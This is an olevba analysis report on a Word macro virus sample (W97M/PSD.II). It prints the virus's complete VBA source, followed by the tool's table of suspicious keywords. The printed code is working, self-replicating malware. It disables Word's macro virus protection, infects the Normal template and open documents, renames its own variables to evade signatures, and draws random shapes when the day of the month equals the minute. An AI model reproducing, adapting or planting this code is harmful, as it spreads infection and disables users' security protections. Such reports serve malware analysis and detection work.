olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-150fc8dae56d583009952aa14055ffa981f189bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-150fc8dae56d583009952aa14055ffa981f189bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For IP7142 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next IP7142: End If
TM8270 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
SD2131 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set QK5863 = ActiveDocument.VBProject.VBComponents.Item(1)
VC4733 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set QK5863 = NormalTemplate.VBProject.VBComponents.Item(1)
DM6864 = True
Call EC2868_TV3946
ActiveDocument.Saved = True
End If
If DM6864 <> True And VC4733 <> True Then GoTo KS3736
If DM6864 = True Then QK5863.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TM8270 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If VC4733 = True Then QK5863.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SD2131 - 4))
KS3736:
If SD2131 <> 0 And TM8270 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function EC2868_TV3946()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "HN5483": r1(2) = "HM8762": r1(3) = "UH2814": r1(4) = "HF2285": r1(5) = "TV3946": r1(6) = "TM8270"
r1(7) = "SD2131": r1(8) = "VC4733":: r1(9) = "QK5863": r1(10) = "DM6864": r1(11) = "KS3736": r1(12) = "EC2868": r1(13) = "GT9585": r1(14) = "MB8425": r1(15) = "IP7142"
For IP7142 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call TV3946(a1, r1(IP7142))
Next IP7142
End Function 'VAMP v1.0 [thanks Vic!]
Private Function TV3946(MB8425, GT9585 As String)
On Error Resume Next
Dim HN5483 As Long: Dim HM8762 As Long: Dim UH2814 As Long: Dim HF2285 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
HN5483 = 1: HM8762 = 1: UH2814 = .CountOfLines: HF2285 = Len(.Lines(.CountOfLines, 1))
Do While .Find(GT9585, HN5483, HM8762, UH2814, HF2285, True)
strline = .Lines(HN5483, 1)
strline = Left(strline, HM8762 - 1) & MB8425 & Mid(strline, HF2285)
.replaceline HN5483, strline
HN5483 = UH2814 + 1: HM8762 = 1:
UH2814 = .CountOfLines
HF2285 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

